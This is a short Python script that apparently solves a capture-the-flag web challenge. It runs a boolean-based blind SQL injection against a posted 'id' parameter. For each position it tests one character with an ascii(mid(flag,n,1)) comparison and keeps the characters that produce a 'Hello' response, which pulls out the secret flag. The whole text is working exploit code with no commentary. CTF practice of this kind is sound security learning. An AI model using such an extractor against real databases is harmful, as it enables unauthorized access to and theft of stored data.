import requests
import string

url = 'http://b64e2d49-8ca0-4102-a2fd-fa16acc7fbb0.node5.buuoj.cn:81/index.php'
strings = string.printable
flag = ''
for count in range(1, 60):
    for char in strings:
        payload = f'(select(ascii(mid(flag,{count},1))={ord(char)})from(flag))'
        response = requests.post(url, {'id': payload})
        if 'Hello' in response.text:
            flag += char
            print(flag)
            if char == '}':
                exit()